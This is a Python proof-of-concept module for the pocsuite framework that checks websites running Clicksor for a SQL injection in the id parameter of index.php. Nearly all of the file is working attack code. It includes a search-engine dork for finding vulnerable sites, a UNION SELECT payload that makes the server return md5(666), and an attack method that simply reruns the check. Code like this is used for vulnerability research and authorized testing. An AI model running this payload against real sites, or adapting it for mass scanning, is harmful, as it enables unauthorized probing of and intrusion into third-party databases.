#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

class TestPOC(POCBase):
    vulID = 'SSV-68525'  # vul ID
    version = '1'
    author = 'fenghh'
    vulDate = '2010-05-04'
    createDate = '2015-10-15'
    updateDate = '2015-10-15'
    references = ['http://sebug.net/vuldb/ssvid-19358']
    name = 'Clicksor SQL Injection Vulnerability'
    appPowerLink = 'www.clicksor.com'
    appName = 'Clicksor'
    appVersion = 'N/A'
    vulType = 'SQL Injection'
    desc = '''  
        google dock:" Powered by Clicksor.com Contextual Advertising".
        index.php?id参数导致过滤
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        output = Output(self)
        result = {}
        payload = "/index.php?page=view&id=-511 UNION SELECT 1,md5(666),3,4,5,6,7,8--"
        verify_url = self.url + payload
        content = req.get(verify_url).content
        if 'fae0b27c451c728867a567e8c1bb4e53' in content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = verify_url
            output.success(result)
        else:
            output.fail('SQL Injection Failed')
        return output

    def _attack(self): 
        return self._verify()

register(TestPOC)